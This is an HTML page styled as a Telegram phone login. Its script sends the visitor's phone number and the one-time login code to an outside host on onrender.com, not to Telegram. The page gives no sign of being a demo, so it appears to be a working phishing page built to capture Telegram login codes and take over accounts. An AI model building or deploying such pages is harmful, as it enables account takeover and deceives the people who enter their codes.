<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Telegram Phone Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
      width: 300px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      margin-bottom: 20px;
      border: 1px solid #ddd;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #0088cc;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background: #007bb5;
    }
    .hidden {
      display: none;
    }
    .message {
      margin-top: 10px;
      font-size: 14px;
      color: green;
    }
    .error {
      color: red;
    }
  </style>
</head>
<body>
  <div class="container">
    <h3>Telegram Login</h3>
    <input type="text" id="phone" placeholder="Phone Number" />
    <button onclick="sendCode()">Send Code</button>

    <div id="code-section" class="hidden">
      <input type="text" id="code" placeholder="Enter Code" />
      <button onclick="verifyCode()">Verify Code</button>
    </div>

    <div id="message" class="message"></div>
  </div>

  <script>
    const backendBaseURL = "https://telegram-backend-o5bg.onrender.com";

    async function sendCode() {
      const phone = document.getElementById("phone").value;
      const message = document.getElementById("message");
      message.textContent = "";
      try {
        const res = await fetch(\`\${backendBaseURL}/send-code\`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ phone }),
        });
        const data = await res.json();
        if (data.success) {
          document.getElementById("code-section").classList.remove("hidden");
          message.textContent = "Code sent!";
          message.classList.remove("error");
        } else {
          message.textContent = "Error sending code";
          message.classList.add("error");
        }
      } catch (err) {
        message.textContent = "Error: " + err.message;
        message.classList.add("error");
      }
    }

    async function verifyCode() {
      const phone = document.getElementById("phone").value;
      const code = document.getElementById("code").value;
      const message = document.getElementById("message");
      message.textContent = "";
      try {
        const res = await fetch(\`\${backendBaseURL}/verify-code\`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ phone, code }),
        });
        const data = await res.json();
        if (data.success) {
          message.textContent = "Login successful!";
          message.classList.remove("error");
        } else {
          message.textContent = "Invalid code";
          message.classList.add("error");
        }
      } catch (err) {
        message.textContent = "Error: " + err.message;
        message.classList.add("error");
      }
    }
  </script>
</body>
</html>
